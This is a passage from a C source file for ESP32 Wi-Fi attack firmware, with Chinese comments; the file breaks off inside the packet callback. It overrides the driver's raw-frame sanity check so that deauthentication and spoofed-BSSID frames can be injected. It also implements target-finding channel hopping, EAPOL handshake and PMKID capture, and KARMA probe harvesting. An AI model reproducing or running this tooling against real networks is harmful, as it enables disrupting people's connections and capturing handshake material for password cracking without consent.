/*
 * wifi_attack.c: Wi-Fi 攻击模块实现
 *
 * 参考:
 *   - ESP-IDF simple_sniffer (cmd_sniffer.c) promiscuous 启动链 / 回调解析
 *   - esp_wifi.h esp_wifi_80211_tx() 原始帧注入
 *
 * 状态机:
 *   IDLE  --sniff_start-->  SNIFF   --sniff_stop/done-->  IDLE
 *   IDLE  --deauth/beacon/probe_start-->  INJECT  --stop/done-->  IDLE
 * 嗅探与注入互斥 (cli 层强制).
 *
 * 安全停止: promiscuous 回调运行在 wifi task 上下文, 直接调 set_promiscuous(false)
 *   可能死锁. 故回调只递减计数 + 唤醒独立 stopper task, 由后者执行真正停止.
 */
#include "wifi_attack.h"
#include <math.h>
#include "radio_common.h"
#include "rgb_led.h"
#include "wifi_db.h"
#include "http_server.h"
#include "ble_cli.h"
#include "cap.h"
#include "hs.h"
#include "karma.h"
#include "event_bus.h"
#include "frame_build.h"

#include <stdatomic.h>
#include <string.h>
#include <stdio.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_log.h"
#include "esp_check.h"
#include "nvs_flash.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_rom_uart.h"
#include "esp_err.h"
#include <stdarg.h>

/* 受控看门狗辅助
 * 关键长跑任务自订阅 + 循环内喂狗. TWDT 未启用时宏为空, 零开销. */
#if CONFIG_ESP_TASK_WDT_EN
#include "esp_task_wdt.h"
#define WDT_ADD()    do { esp_task_wdt_add(NULL); } while (0)
#define WDT_RESET()  do { esp_task_wdt_reset(); } while (0)
/* 退出前必须注销: 否则 TCB 内存被新任务复用时, 新任务 add 会报
 * "task is already subscribed" (实测遇到过). */
#define WDT_DEL()    do { esp_task_wdt_delete(NULL); } while (0)
#else
#define WDT_ADD()    do { } while (0)
#define WDT_RESET()  do { } while (0)
#define WDT_DEL()    do { } while (0)
#endif

/* 注入帧 sanity check 绕过
 * esp_wifi_80211_tx() 内部调用 ieee80211_raw_frame_sanity_check()
 * (libnet80211.a, 闭源). 该函数会:
 *   - 拒绝 deauth/disassoc (subtype 0xC/0xA)
 *   - STA 模式下拒绝源 MAC 不等于自身 MAC 的帧 (beacon flood / 伪造 BSSID 失败)
 * 我们在自身代码里定义同名函数, 链接器优先取我们的版本,
 * 始终返回 0 (ESP_OK) 即放行所有帧. 这是 ESP32 注入工具的标准做法.
 * 签名按实际调用: ieee80211_raw_frame_sanity_check(ifx, buf, len, en_sys_seq). */
int ieee80211_raw_frame_sanity_check(int32_t ifx, const void *buf, int32_t len, int32_t en_sys_seq)
{
    (void)ifx; (void)buf; (void)len; (void)en_sys_seq;
    return 0;
}

static const char *TAG = "WIFI";

/* Direct UART write bypassing stdio lock. Used by inject_task (low prio)
 * to avoid priority-inheritance deadlock with cli_task (high prio) printf.
 * 同时把这一行事件投递给 BLE 通道 (非阻塞入队, 由 ble_evt_task 限速发出),
 * 否则 EAPOL/Deauth 命中与作业进度只进串口, 手机端看不到. */
static void raw_out(const char *fmt, ...)
{
    char buf[256];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) {
        if (n > (int)sizeof(buf)) n = sizeof(buf);
        for (int i = 0; i < n; i++) {
            esp_rom_output_tx_one_char(buf[i]);
        }
        ble_event_post(buf);
    }
}

/* 回调输出预算.
 * sniffer_cb 跑在 Wi-Fi 驱动任务里, raw_out 走 stdout, BLE 抓包期间还会
 * 转成 notify 并 sleep. 自测 deauth 时每秒 50 个 deauth 帧, 若每帧都打印,
 * 驱动任务被拖住, 表现为整机假死. 这里限成每秒 10 行, 超出的丢弃并计数. */
static _Atomic uint32_t s_cb_out_sec  = 0;
static _Atomic uint32_t s_cb_out_cnt  = 0;
static _Atomic uint32_t s_cb_out_drop = 0;

static bool cb_out_allow(void)
{
    uint32_t now = (uint32_t)(esp_timer_get_time() / 1000000);
    if (atomic_load(&s_cb_out_sec) != now) {
        atomic_store(&s_cb_out_sec, now);
        atomic_store(&s_cb_out_cnt, 0);
    }
    if (atomic_fetch_add(&s_cb_out_cnt, 1) >= 10) {
        atomic_fetch_add(&s_cb_out_drop, 1);
        return false;
    }
    return true;
}


/* Forward decl: sniff_stop_common is defined later, used by stop_all */
static void sniff_stop_common(void);
static void sniff_progress_stop(void);

static _Atomic wifi_atk_state_t s_state = WIFI_ATK_IDLE;
static _Atomic uint32_t s_sniff_remaining = 0;   /* 0 = 永续; >0 递减到 0 触发停 */
static _Atomic uint32_t s_sniff_total     = 0;
static _Atomic uint8_t  s_sniff_channel   = 0;
static _Atomic uint32_t s_inject_total    = 0;

/* 注入任务在跑与否, 用一个原子标志表示, 不用信号量也不用互斥量.
 *
 * 互斥量: FreeRTOS 的互斥量带所有者记录, 而这里获取发生在 CLI 任务、
 *   释放发生在注入任务, 跨任务 give 会触发 xTaskPriorityDisinherit
 *   断言并整机重启, 这就是 2.2.0 上 beaconflood 点了没反应的原因.
 * 二值信号量: 没有所有权约束, 但"先清句柄再 give"的收尾顺序有竞态:
 *   等待方看到句柄清空就返回了, 信号量的 give 还没发生, 于是后面的
 *   take 等满 2 秒超时, 表现为"随机启动不了".
 * 原子标志 + CAS 两个问题都没有, 也不需要 init 里创建任何东西. */
static _Atomic bool     s_inject_running = false;
static SemaphoreHandle_t s_stop_sem    = NULL;    /* 唤醒嗅探 stopper 任务 */
static _Atomic bool      s_inject_stop  = false;

/* 嗅探停止令牌: 0=闲, 1=已请求, 2=stopper 正在收尾.
 *
 * 为什么不用"裸 give 二值信号量"了结: 令牌是异步消费的, 计数嗅探到数后在
 * 驱动回调里 give, stopper 什么时候被调度到是不确定的. 用户紧接着再开一次
 * 嗅探时, 迟到的 stopper 会把它刚打开的 promiscuous 关掉, 现象是
 * 「点了开始, 状态栏显示 SNIFF 但一包都收不到」. 和 beacon 那个"点了没反应"
 * 是同一族缺陷, 只是这条路径不会重启, 更隐蔽.
 *
 * 三态里"2=执行中"是新会话的同步栅栏: 新会话起来前先等它落地,
 * 于是"决策"与"收尾"之间那个会把新会话误杀的窗口被关掉. */
static _Atomic int       s_stop_state   = 0;

/* 原始帧流 (PKT/HEX) 输出开关.
 * 默认关闭: 回调运行在 WiFi 驱动任务上下文, printf/fflush/hex 会阻塞驱动任务,
 * 进而拖垮 WiFi + BLE + CLI (整机假死). 仅在需要有线串口抓包时打开. */
static _Atomic bool      s_sniff_verbose = false;

/* 嗅探进度任务 (独立低优先级, 每秒输出一行, 不在回调里做任何输出) */
static TaskHandle_t      s_progress_task = NULL;
static _Atomic bool      s_progress_run  = false;
static _Atomic uint32_t  s_progress_gen  = 0;    /* 进度任务会话号 */

/* 信道范围 (ESP32-C5 双频)
 * 2.4 GHz: 1..14 (14 仅日本, 一般 1..13)
 * 5   GHz: 36,40,44,48 (UNII-1), 52,56,60,64 (UNII-2A, DFS),
 *          100..144 (UNII-2C, DFS), 149,153,157,161,165,169,173,177 (UNII-3)
 * C5 5G 频率上限 5885 MHz (= ch 177), 故 UNII-3 可放宽到 177. */
static const uint8_t s_channels_2g[]  = {1,2,3,4,5,6,7,8,9,10,11,12,13};
static const uint8_t s_channels_5g[]  = {
    36, 40, 44, 48, 52, 56, 60, 64,
    100,104,108,112,116,120,124,128,132,136,140,144,
    149,153,157,161,165,169,173,177
};
#define N_CH_2G  (sizeof(s_channels_2g)/sizeof(s_channels_2g[0]))
#define N_CH_5G  (sizeof(s_channels_5g)/sizeof(s_channels_5g[0]))

static bool is_valid_channel(uint8_t ch)
{
    if (ch >= 1 && ch <= 14) return true;
    for (size_t i = 0; i < N_CH_5G; i++) {
        if (s_channels_5g[i] == ch) return true;
    }
    return false;
}

static _Atomic bool s_channel_rotate = false;
static _Atomic uint32_t s_rotate_gen = 0;     /* 轮询任务会话号 */
static _Atomic uint32_t s_dwell_ms = 1000;

/* 自适应信道轮询
 * 固定 dwell 的问题: 13 个 2.4G 信道里通常只有 1/6/11 有货, 20 多个 5G 信道
 * 大多是空的, 但每个都停同样久, 等于把 80% 的时间花在空气上.
 *
 * 做法: 每个信道记录"命中权重"(Beacon/Data/EAPOL/Deauth), 下一轮按
 *   份额比 fair_share 的比值给 dwell 加权, 比值夹在 [0.55, 3.0] 之间,
 * 每扫完一轮全局衰减一半, 让热点搬家后能自然跟上.
 * 全部是原子操作, 回调里只做一次 fetch_add, 不加锁不阻塞驱动任务. */
#define CH_IDX_MAX 200
static _Atomic uint16_t s_ch_hits[CH_IDX_MAX + 1];   /* uint16 够了: 每轮结束会衰减 */
/* WR-λ 需要"收益率"(帧/秒)而不是"帧数". 只记帧数的话, 停留久的信道天然
 * 帧多, 形成正反馈, 权重比值会失控, 这正是 实测只跑出
 * -0.4%(等于白做)的原因. 同时记驻留毫秒数, 两者相除才是可比的量. */
static _Atomic uint32_t s_ch_listen[CH_IDX_MAX + 1]; /* 该信道累计驻留 ms */
static _Atomic uint32_t s_rate_mean     = 0;         /* 每轮重算一次, 避免逐信道遍历 */
static _Atomic uint32_t s_ch_hits_total  = 0;
static _Atomic uint32_t s_auto_round     = 0;
static _Atomic uint32_t s_auto_dwell_now = 0;
static _Atomic bool     s_auto_adaptive  = true;

static inline void chan_hit(uint8_t ch, uint16_t w)
{
    if (ch == 0 || ch > CH_IDX_MAX) return;
    if (!atomic_load(&s_channel_rotate)) return;
    atomic_fetch_add(&s_ch_hits[ch], w);
    atomic_fetch_add(&s_ch_hits_total, (uint32_t)w);
}

/* 覆盖优先调度 (PSD) 的输入: 每个信道"本轮作业里新发现过几台 AP".
 *
 * 为什么不能拿帧率当目标: 帧率高的信道往往是"一台 AP 在刷视频", 那里没有
 * 新目标可找; 反之一台静默 AP 每秒只发 10 个 beacon, 帧率永远排不上号.
 * 调度的目标应该是"还有多少台没被发现", 这个计数直接对应该目标.
 *
 * 只在自动轮询期间累计, 每次 auto 启动清零. */
static _Atomic uint16_t s_ch_found[CH_IDX_MAX + 1];
static _Atomic uint32_t s_ch_found_total = 0;
/* 每信道被驻留过几次. 第一次必须给足探测下限, 之后才敢用便宜的 150ms:
 * 首轮的 150ms 会让"没探过"和"探过是空的"变成同一件事, 实测 5 秒时比
 * 均匀扫描少发现 3.8 台. */
static _Atomic uint16_t s_ch_visits[CH_IDX_MAX + 1];

static inline void chan_new_ap(uint8_t ch)
{
    if (ch == 0 || ch > CH_IDX_MAX) return;
    if (!atomic_load(&s_channel_rotate)) return;
    atomic_fetch_add(&s_ch_found[ch], 1);
    atomic_fetch_add(&s_ch_found_total, 1);
}

/* 调度策略. wrl = 原来的按帧率加权, psd = 按发现数排序 + 探测下限. */
typedef enum { AUTO_POLICY_WRL = 0, AUTO_POLICY_PSD = 1 } auto_policy_t;
/* 默认 psd: 实测 dwell=150 时 15 秒内多发现 1.1 台 (bootstrap 区间 +0.2~+1.8),
 * dwell=300 时与 wrl 打平. 短驻留正是"想快扫"的用户会选的配置, 那里旧的
 * 每信道 floor(base/6=25ms) 已经低于 beacon 间隔, 系统性地漏检. */
static _Atomic uint8_t s_auto_policy = AUTO_POLICY_PSD;

/* 探测下限.
 * 一台 AP 的 beacon 间隔默认 102.4ms, 驻留 d 毫秒能看到的概率是
 *   1 - exp(-d / 102.4)
 * d=50 时只有 39%, d=250 时 91%. 低于 2 个 beacon 周期就漏检, 而漏检会被
 * 调度器读成"这个信道没货", 于是下次给得更短, 形成越漏越短的死循环.
 * 250ms 是 2.4 个周期, 仿真里漏检率从 27% 降到 8%. */
#define AUTO_DET_FLOOR_MS 250u

/* 一次驻留结束: 把这段驻留时间记到该信道上. 与 chan_hit() 配合构成收益率. */
static void chan_close(uint8_t ch, uint32_t dwell_ms)
{
    if (ch == 0 || ch > CH_IDX_MAX || dwell_ms == 0) return;
    atomic_fetch_add(&s_ch_listen[ch], dwell_ms);
}

/* 一轮结束: 命中/驻留同时减半(指数遗忘), 并重算全网收益率均值.
 * 减半是必须的, 热点搬家、信道拥挤度变化后, 旧样本要尽快失效. */
static void auto_decay(void)
{
    uint32_t sum = 0;
    int cnt = 0;
    for (int i = 1; i <= CH_IDX_MAX; i++) {
        uint16_t h = atomic_load(&s_ch_hits[i]);
        uint32_t l = atomic_load(&s_ch_listen[i]);
        if (h) atomic_store(&s_ch_hits[i], (uint16_t)(h / 2));
        if (l) atomic_store(&s_ch_listen[i], l / 2);
        /* 至少采过 150ms 才认为这个样本可用, 否则单帧就会算出离谱的速率 */
        if (l >= 150 && h > 0) {
            sum += (uint32_t)((uint64_t)h * 1000u / l);
            cnt++;
        }
    }
    atomic_store(&s_ch_hits_total, atomic_load(&s_ch_hits_total) / 2);
    atomic_store(&s_rate_mean, cnt ? (sum / (uint32_t)cnt) : 0);
}

/* WR-λ: dwell(ch) = base × (rate(ch)/rate_mean)^gain
 * rate 取帧/秒 (与驻留时长无关), 避免"待得久->帧多->待更久"的正反馈 (旧病灶).
 * 每轮仍遍历全部信道, 只是时长不同, 弱信道不饿死; 找目标比刷单点更有用.
 * clamp 到 [base/6, base×2]: 下限防独占/空转, 上限防虚假高值把射频钉死. */
static uint32_t auto_dwell_for(uint8_t ch, uint32_t base)
{
    if (!atomic_load(&s_auto_adaptive)) return base;
    uint32_t mean = atomic_load(&s_rate_mean);
    if (mean < 2) return base;                /* 还没攒够样本, 先均匀扫一轮 */

    uint32_t h = (ch <= CH_IDX_MAX) ? (uint32_t)atomic_load(&s_ch_hits[ch]) : 0;
    uint32_t l = (ch <= CH_IDX_MAX) ? atomic_load(&s_ch_listen[ch]) : 0;
    uint32_t r = (l >= 100) ? (uint32_t)((uint64_t)h * 1000u / l) : mean;

    uint32_t d = (uint32_t)((uint64_t)base * (r + 1) / (mean + 1));

    uint32_t lo = base / 6;
    if (lo < 60) lo = 60;
    uint32_t hi = base * 2;
    if (hi > 2000) hi = 2000;
    if (hi < lo + 1) hi = lo + 1;

    if (d < lo) d = lo;
    if (d > hi) d = hi;
    return d;
}

/* PSD 的驻留: 按"本信道发现了多少台 AP"分配.
 *   热信道  d = base × sqrt(该信道发现数 / 全部信道平均发现数), 夹到 [下限, 2×base]
 *   冷信道  下限的 60%
 * 开方是为了抑制独占: 线性分配时 ch6 会拿走 base 的 4 倍, 其它信道饿死;
 * 开方后最热与最冷的驻留比约 2.4:1, 与仿真的最优区间一致. */
static uint32_t auto_dwell_psd(uint8_t ch, uint32_t base)
{
    uint32_t floor_ms = AUTO_DET_FLOOR_MS;
    if (base <= floor_ms) floor_ms = base;   /* 用户把 base 调到下限以下才跟着降 */

    uint32_t w      = (ch <= CH_IDX_MAX) ? atomic_load(&s_ch_found[ch]) : 0;
    uint32_t total  = atomic_load(&s_ch_found_total);
    uint32_t visits = (ch <= CH_IDX_MAX) ? atomic_load(&s_ch_visits[ch]) : 0;
    uint32_t n      = (uint32_t)(N_CH_2G + N_CH_5G);

    /* 第一次接触一律给 base, 与旧策略的首轮完全一致:
     * 首轮就压到下限以下会少发现约 1.3 台 (实测 10 次 A/B), 而首轮的覆盖
     * 速度并不值得拿检出率去换. 便宜只用在"探过、确认是空的"信道上. */
    if (visits == 0) return base;
    if (w == 0 || total == 0) return floor_ms * 3 / 5;   /* 探过是空的: 便宜地复检 */

    float mean = (float)total / (float)n;
    uint32_t d = (uint32_t)((float)base * sqrtf((float)w / mean));

    uint32_t hi = base * 2;
    if (hi > 2000) hi = 2000;
    if (d < floor_ms) d = floor_ms;
    if (d > hi) d = hi;
    return d;
}

static void auto_visit(uint8_t ch, uint32_t base)
{
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    atomic_store(&s_sniff_channel, ch);
    rgb_led_event(RGB_EV_CHAN_SWITCH, 300);

    uint32_t dwell = (atomic_load(&s_auto_policy) == AUTO_POLICY_PSD)
                     ? auto_dwell_psd(ch, base) : auto_dwell_for(ch, base);
    atomic_store(&s_auto_dwell_now, dwell);
    vTaskDelay(pdMS_TO_TICKS(dwell));
    chan_close(ch, dwell);
    if (ch <= CH_IDX_MAX) atomic_fetch_add(&s_ch_visits[ch], 1);
}

/* PSD 每轮重排访问顺序: 发现数多的信道先走.
 * 41 个元素, 插入排序足够, 且天然稳定 (相同权重保持原顺序, 不会来回抖). */
static uint8_t s_psd_order[N_CH_2G + N_CH_5G];

static int psd_build_order(void)
{
    int n = 0;
    for (size_t i = 0; i < N_CH_2G; i++) s_psd_order[n++] = s_channels_2g[i];
    for (size_t i = 0; i < N_CH_5G; i++) s_psd_order[n++] = s_channels_5g[i];
    for (int i = 1; i < n; i++) {
        uint8_t  v  = s_psd_order[i];
        uint16_t wv = (v <= CH_IDX_MAX) ? atomic_load(&s_ch_found[v]) : 0;
        int j = i - 1;
        while (j >= 0 && ((s_psd_order[j] <= CH_IDX_MAX
                           ? atomic_load(&s_ch_found[s_psd_order[j]]) : 0) < wv)) {
            s_psd_order[j + 1] = s_psd_order[j];
            j--;
        }
        s_psd_order[j + 1] = v;
    }
    return n;
}

static void channel_rotate_task(void *pv)
{
    /* 会话号在创建时固定: 见 sniff_progress_task 里同样的处理.
     * 轮询任务一轮要在某个信道上停留 dwell 毫秒(默认 300ms), "停→立刻再开"
     * 时旧任务正睡在这段延时里, 醒来看到标志又亮了就接着干, 于是两个任务
     * 同时抢着切信道, 表现是自动轮询乱跳、命中率全线掉. 号不对就退出. */
    uint32_t mine = (uint32_t)(uintptr_t)pv;
    WDT_ADD();
    /* WR-λ 按固定顺序 2.4G→5G 走; PSD 每轮按发现数重排 */
    size_t idx_2g = 0, idx_5g = 0;
    bool band_2g = true;
    while (atomic_load(&s_channel_rotate) && atomic_load(&s_rotate_gen) == mine) {
        uint32_t base = atomic_load(&s_dwell_ms);

        if (atomic_load(&s_auto_policy) == AUTO_POLICY_PSD) {
            int n = psd_build_order();
            for (int i = 0; i < n; i++) {
                if (!atomic_load(&s_channel_rotate) ||
                    atomic_load(&s_rotate_gen) != mine) break;
                auto_visit(s_psd_order[i], base);
                WDT_RESET();
            }
            atomic_fetch_add(&s_auto_round, 1);
            continue;
        }

        uint8_t ch;
        if (band_2g) {
            ch = s_channels_2g[idx_2g % N_CH_2G];
            idx_2g++;
            if (idx_2g >= N_CH_2G) { band_2g = false; idx_2g = 0; }
        } else {
            ch = s_channels_5g[idx_5g % N_CH_5G];
            idx_5g++;
            if (idx_5g >= N_CH_5G) {
                band_2g = true; idx_5g = 0;
                /* 一整轮结束: 老命中率减半, 让热点搬家后权重能跟上 */
                auto_decay();
                atomic_fetch_add(&s_auto_round, 1);
            }
        }
        auto_visit(ch, base);
        WDT_RESET();
    }
    WDT_DEL();
    vTaskDelete(NULL);
}

typedef enum {
    INJECT_DEAUTH,
    INJECT_BEACON,
    INJECT_PROBE,
} inject_mode_t;

typedef struct {
    inject_mode_t mode;
    uint8_t  bssid[6];
    uint8_t  sta[6];
    uint16_t reason;
    char     ssid_prefix[32];
    uint8_t  channel;
    uint32_t count;          /* 0 = 持续 */
    uint32_t interval_ms;
} inject_args_t;

/* 请求停止嗅探 (可从驱动回调上下文调用: 只投递令牌, 不做任何停止动作).
 * 真正的关 promiscuous 在 stopper 任务里做: promiscuous 回调上下文里
 * 反向去关 promiscuous 会和驱动自己打架, 这是 stopper 存在的唯一理由. */
static void sniff_request_stop(void)
{
    int expected = 0;
    atomic_compare_exchange_strong(&s_stop_state, &expected, 1);
    if (s_stop_sem) xSemaphoreGive(s_stop_sem);
}

/* 起新会话前的同步栅栏: 把还在飞的停止令牌等落地.
 * 没有它, 新会话刚 set_promiscuous(true) 就被迟到的 stopper 关掉.
 * 令牌是 0 时一次都不等, 所以常态开销为零. */
static void sniff_stop_barrier(void)
{
    for (int i = 0; i < 60 && atomic_load(&s_stop_state) != 0; i++) {
        vTaskDelay(pdMS_TO_TICKS(1));
    }
    /* 等不出来就撤销: stopper 醒来发现令牌没了会自己跳过.
     * 这一句堵住最后一段窗口: 令牌还没被 stopper 领走(仍是 1)时,
     * 直接让它在 1 上作废, 而不是留着给 stopper 去误伤新会话. */
    int expected = 1;
    atomic_compare_exchange_strong(&s_stop_state, &expected, 0);
}

/* 嗅探 stopper 任务 (安全停止) */
static void sniff_stopper_task(void *pv)
{
    while (1) {
        xSemaphoreTake(s_stop_sem, portMAX_DELAY);
        /* CAS 从 1 抢到 2: 抢不到说明同步路径(命令上下文)已经把令牌吃掉并
         * 自己收尾过了, 这里再关一次只会补出一行重复的 DONE. */
        int expected = 1;
        if (!atomic_compare_exchange_strong(&s_stop_state, &expected, 2)) {
            continue;
        }
        /* 唤醒: 执行真正停止 */
        esp_wifi_set_promiscuous(false);
        atomic_store(&s_state, WIFI_ATK_IDLE);
        sniff_progress_stop();
        rgb_led_set_status(RGB_IDLE);
        raw_out("META,WIFI,SNIFF,DONE,total,%u\n",
                (unsigned)atomic_load(&s_sniff_total));
        /* 收尾全部做完才落 0, 新会话据此判断" 可以安全起来了" */
        atomic_store(&s_stop_state, 0);
    }
}

/* 嗅探进度任务
 * 每秒输出一行进度 (total / 当前信道 / AP 数 / 客户端数),
 * 供 App 的 HUD 实时显示. 所有输出都在本任务完成, 不占用驱动的回调上下文. */
static void sniff_progress_task(void *pv)
{
    /* 会话号在创建时就固定下来, 不靠运行时再读一次 (那会读到下一次 start
     * 改过的值, 新任务反而立刻退出). */
    uint32_t mine = (uint32_t)(uintptr_t)pv;
    WDT_ADD();
    uint32_t last = UINT32_MAX;
    while (atomic_load(&s_progress_run) && atomic_load(&s_progress_gen) == mine) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        WDT_RESET();
        if (!atomic_load(&s_progress_run)) break;
        if (atomic_load(&s_progress_gen) != mine) break;   /* 已被新会话取代 */
        uint32_t total = atomic_load(&s_sniff_total);
        if (total == last) continue;   /* 无新增, 不刷屏 */
        last = total;
        /* 普通任务上下文: 可用 printf (会经 __wrap__write_r 被 BLE 捕获) */
        printf("META,WIFI,SNIFF,PROGRESS,total,%u,channel,%u,aps,%d,clients,%d\n",
               (unsigned)total,
               (unsigned)atomic_load(&s_sniff_channel),
               wifi_db_ap_count(), wifi_db_client_count());
        fflush(stdout);
        /* 本任务在命令窗口之外, 进度需经 BLE 事件通道才能到达手机 */
        {
            char evt[128];
            snprintf(evt, sizeof(evt),
                     "META,WIFI,SNIFF,PROGRESS,total,%u,channel,%u,aps,%d,clients,%d",
                     (unsigned)total,
                     (unsigned)atomic_load(&s_sniff_channel),
                     wifi_db_ap_count(), wifi_db_client_count());
            ble_event_post(evt);
        }
    }
    s_progress_task = NULL;
    WDT_DEL();
    vTaskDelete(NULL);
}

static void sniff_progress_start(void)
{
    /* 用会话号而不是 run 标志判断" 该谁上班".
     *
     * 只看 run 标志的话: 进度任务每秒才醒一次, "停→立刻再开" 时旧任务还睡在
     * vTaskDelay 里, 醒来发现 run 又被新会话置成 true, 就以为还是自己的班,
     * 于是每做一次" 停→立刻再开" 就多一个进度任务, 每秒重复刷一行 PROGRESS.
     * 改成" 号不对就退出", 旧任务最多再活一秒, 不会重复输出. */
    uint32_t g = (uint32_t)atomic_fetch_add(&s_progress_gen, 1) + 1;
    atomic_store(&s_progress_run, true);
    if (xTaskCreate(sniff_progress_task, "snprog", 3072,
                    (void *)(uintptr_t)g, 3, &s_progress_task) != pdPASS) {
        atomic_store(&s_progress_run, false);
    }
}

static void sniff_progress_stop(void)
{
    atomic_store(&s_progress_run, false);
}

/* promiscuous 回调 */

/* 从 mgmt 帧体里提取 SSID IE. 返回写入 dst 的字节数 (不含 nul), 失败 0. */
static int extract_ssid(const uint8_t *frame, int len, char *dst, int dst_cap)
{
    int off = 24;
    while (off + 2 <= len) {
        uint8_t id   = frame[off];
        uint8_t slen = frame[off + 1];
        if (off + 2 + slen > len) break;
        if (id == 0) {
            if (slen == 0) { dst[0] = '\0'; return 0; }
            int n = slen < dst_cap - 1 ? slen : dst_cap - 1;
            memcpy(dst, frame + off + 2, n);
            dst[n] = '\0';
            /* 保留 UTF-8 多字节 (中文 SSID 合法), 只清理控制字符.
             * 原来只要有一个字节 >= 0x80 就整条丢弃, 中文名字的 AP 在
             * 抓包日志里会被误判成 <hidden>. */
            for (int i = 0; i < n; i++) {
                unsigned char c = (unsigned char)dst[i];
                if (c < 0x20 || c == 0x7f) dst[i] = '?';
            }
            return n;
        }
        off += 2 + slen;
    }
    dst[0] = '\0';
    return 0;
}

static void wifi_sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    /* state != SNIFF/DOWNGRADE 表示已停止, 丢弃后续包 */
    wifi_atk_state_t st = atomic_load(&s_state);
    if (st != WIFI_ATK_SNIFF && st != WIFI_ATK_DOWNGRADE && st != WIFI_ATK_PMKID) return;
    if (!buf || type == WIFI_PKT_MISC) return;

    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    if (p->rx_ctrl.rx_state != 0) return;   /* FCS 校验失败 */

    int sig_len = p->rx_ctrl.sig_len;
    if (sig_len < 24) return;
    int frame_len = sig_len - 4;            /* sig_len 含 FCS, pcap 用无 FCS */
    if (frame_len <= 0 || frame_len > RFTOOL_MAX_FRAME_LEN) return;

    const uint8_t *f = p->payload;
    uint8_t ftype = frame_type(f);
    uint8_t fsub  = frame_subtype(f);
    int8_t  rssi  = (int8_t)p->rx_ctrl.rssi;

    /* DOWNGRADE 模式: 只抓 EAPOL 4-way, 不打 PKT 行 (避免刷屏) */
    if (st == WIFI_ATK_DOWNGRADE) {
        /* 落盘: 降级模式正是要抓握手, 原始帧必须留一份 */
        cap_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel),
                 (int8_t)p->rx_ctrl.noise_floor, (uint8_t)p->rx_ctrl.rate);
        hs_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel));
        if (ftype == FC_TYPE_DATA) {
            wifi_db_update_client(f, frame_len, rssi);
            if (wifi_db_check_eapol(f, frame_len, rssi)) {
                char esrc[18], edst[18];
                mac_to_str(f + 10, esrc);
                mac_to_str(f + 4, edst);
                if (cb_out_allow()) {
                    raw_out("META,WIFI,EAPOL,DETECTED,src,%s,dst,%s\n", esrc, edst);
                }
                rgb_led_pulse(80, 80, 80, 0);
            }
        }
        return;
    }

    /* PMKID 模式: 只喂抓包与握手归档, 不做入库/统计 (关联过程只有几帧) */
    if (st == WIFI_ATK_PMKID) {
        const uint8_t pch = atomic_load(&s_sniff_channel);
        cap_feed(f, (uint16_t)frame_len, rssi, pch,
                 (int8_t)p->rx_ctrl.noise_floor, (uint8_t)p->rx_ctrl.rate);
        hs_feed(f, (uint16_t)frame_len, rssi, pch);
        return;
    }

    /* SNIFF 模式
     * 关键: 本回调运行在 WiFi 驱动任务上下文. printf/fflush/hex dump 会阻塞
     * 驱动任务, 进而拖垮 WiFi + BLE + CLI (整机假死, 表现为连上后无任何响应).
     * 因此这里只做轻量入库 (O(1) 哈希查找) + 计数; 原始帧流仅在 verbose 模式下
     * 输出 (默认关闭), 常规情况由 DB 快照 (dump aps/clients) + 进度行提供数据. */
    const uint8_t cur_ch = atomic_load(&s_sniff_channel);
    if (ftype == FC_TYPE_MGMT && (fsub == 0x8 || fsub == 0x5)) {
        if (wifi_db_update_ap(f, frame_len, cur_ch, rssi)) {
            chan_new_ap(cur_ch);                 /* PSD: 这台是本次作业新发现的 */
        }
        chan_hit(cur_ch, 1);                     /* Beacon/ProbeResp 权重 1 */
    }
    if (ftype == FC_TYPE_DATA) {
        wifi_db_update_client(f, frame_len, rssi);
        chan_hit(cur_ch, 2);                     /* 数据帧权重 2 */
        if (wifi_db_check_eapol(f, frame_len, rssi)) {
            chan_hit(cur_ch, 8);                 /* EAPOL 才是真正值钱的 */
            char esrc[18], edst[18];
            mac_to_str(f + 10, esrc);
            mac_to_str(f + 4, edst);
            if (cb_out_allow()) {
                raw_out("META,WIFI,EAPOL,DETECTED,src,%s,dst,%s\n", esrc, edst);
            }
            rgb_led_pulse(80, 80, 80, 0);
        }
    }
    if (ftype == FC_TYPE_MGMT && fsub == 0xc) {
        chan_hit(cur_ch, 8);                     /* Deauth 密集信道优先 */
        char sa[18], da[18];
        mac_to_str(f + 10, sa);
        mac_to_str(f + 4, da);
        if (cb_out_allow()) {
            raw_out("META,WIFI,DEAUTH,DETECTED,src,%s,dst,%s,rssi,%d\n", sa, da, rssi);
        }
    }

    /* 原始帧落盘: 只做分类 + memcpy 进 PSRAM 暂存环, 绝不碰 flash */
    cap_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel),
             (int8_t)p->rx_ctrl.noise_floor, (uint8_t)p->rx_ctrl.rate);
    /* EAPOL 握手归档: 同样只做分类 + 拷贝 */
    hs_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel));
    /* KARMA: 收集 Probe Request 里客户端在找的 SSID */
    karma_feed(f, (int)frame_len, rssi);

    /* 原始帧流 (调试用, 默认关闭 — 会阻塞驱动任务) */
    if (atomic_load(&s_sniff_verbose)) {
        char da[18], sa[18], bssid[18];
        char ssid[34] = "-";
        mac_to_str(f + 4,  da);
        mac_to_str(f + 10, sa);
        mac_to_str(f + 16, bssid);
        if ((ftype == FC_TYPE_MGMT) && (fsub == 0x8 || fsub == 0x5)) {
            extract_ssid(f, frame_len, ssid, sizeof(ssid));
            if (ssid[0] == '\0') { memcpy(ssid, "<hidden>", 9); }
        }
        printf("PKT,WIFI,%s,%s,%d,%d,%s,%s,%s,%s\n",
               frame_type_str(ftype), frame_subtype_str(ftype, fsub),
               frame_len, rssi, sa, da, bssid, ssid);
        fflush(stdout);
        print_hex_line(f, frame_len);
    }

    uint32_t total = atomic_fetch_add(&s_sniff_total, 1) + 1;

    /* 计数模式: 递减, 到 0 唤醒 stopper 安全停止.
